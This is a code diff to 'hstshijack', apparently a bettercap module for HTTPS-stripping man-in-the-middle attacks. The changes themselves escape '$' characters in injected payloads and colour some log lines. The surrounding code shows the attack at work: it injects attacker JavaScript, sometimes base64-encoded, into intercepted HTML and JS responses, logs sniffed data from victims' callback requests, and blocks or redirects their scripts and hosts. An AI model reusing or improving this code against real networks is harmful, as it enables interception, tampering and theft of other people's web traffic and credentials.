@@ -146,9 +146,9 @@ function configure() {
 			}
 
 			if (p[host]) {
-				p[host] = { "payload": p[host].payload + "\n" + custom_payload }
+				p[host] = { "payload": p[host].payload + "\n" + custom_payload.replace(/\$/g, "$$$$$$$$") }
 			} else {
-				p[host] = { "payload": custom_payload }
+				p[host] = { "payload": custom_payload.replace(/\$/g, "$$$$$$$$") }
 			}
 		}
 	}
@@ -158,7 +158,7 @@ function configure() {
 		log_fatal("[" + green + "hstshijack" + reset + "] Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
 	}
 	// Prepare core payload.
-	payload = readFile(payload_path)
+	payload = readFile(payload_path).replace(/\$/g, "$$$$$$$$")
 	payload = payload_container.replace("{{payload}}", payload)
 	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
 	payload = payload.replace("obf_path_whitelist", whitelist_path)
@@ -275,7 +275,7 @@ function onRequest(req, res) {
 		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
 		if (req.Path == "/" + ssl_log_path) {
 			queried_host = atob(req.Query)
-			log_debug("[" + green + "hstshijack" + reset + "] Silent SSL log callback received from " + req.Client + " for " + queried_host + ".")
+			log_debug("[" + green + "hstshijack" + reset + "] Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
 			for (var i = 0; i < target_hosts.length; i++) {
 				var regexp
 				if ( target_hosts[i].indexOf("*") != -1 ) {
@@ -301,7 +301,7 @@ function onRequest(req, res) {
 		// Requests made for this path will print sniffed data.
 		// Requests made for this path will not be proxied.
 		if (req.Path == "/" + callback_path) {
-			log_info("[" + green + "hstshijack" + reset + "] Silent callback received from " + req.Client + " for " + req.Hostname)
+			log_info("[" + green + "hstshijack" + reset + "] Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
 
@@ -339,7 +339,7 @@ function onRequest(req, res) {
 		// Requests made for this path will not be proxied.
 		// Requests made for this path will stop all attacks towards this client for the requested hostname.
 		if (req.Path == "/" + whitelist_path) {
-			log_info("[" + green + "hstshijack" + reset + "] Silent, whitelisting callback received from " + req.Client + " for " + req.Hostname)
+			log_info("[" + green + "hstshijack" + reset + "] Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
 
@@ -435,7 +435,7 @@ function onRequest(req, res) {
 					}
 					res.SetHeader("bettercap", "ignore")
 					ignored = true
-					log_info("[" + green + "hstshijack" + reset + "] Redirecting " + req.Client + " from " + req.Hostname + " to " + intended_host + " because we received a whitelist callback.")
+					log_info("[" + green + "hstshijack" + reset + "] Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
 					break
 				}
 			}
@@ -538,7 +538,7 @@ function onResponse(req, res) {
 	if ( res.GetHeader("bettercap", "") == "ignore" ) {
 		res.RemoveHeader("bettercap")
 		ignored = true
-		log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + req.Hostname + ".")
+		log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
 	} else {
 		for (var a = 0; a < ignore_hosts.length; a++) {
 			var regexp
@@ -577,7 +577,7 @@ function onResponse(req, res) {
 					}
 				}
 				if (ignored) {
-					log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + req.Hostname + ".")
+					log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
 				}
 				break
 			}
@@ -635,7 +635,7 @@ function onResponse(req, res) {
 				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
 					res.Body = ""
 				}
-				log_debug("[" + green + "hstshijack" + reset + "] Blocked script(s) from " + req.Hostname + ".")
+				log_debug("[" + green + "hstshijack" + reset + "] Blocked script(s) from " + bold + req.Hostname + reset + ".")
 				break
 			}
 		}
@@ -665,14 +665,14 @@ function onResponse(req, res) {
 
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
 				res.Body = injection + res.Body
-				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into JS file from " + req.Hostname + ".")
+				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
 			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
 				if (encode) {
 					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
 				} else {
 					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>" + injection + "</script>")
 				}
-				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into HTML file from " + req.Hostname + ".")
+				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
 			}
 		}
 
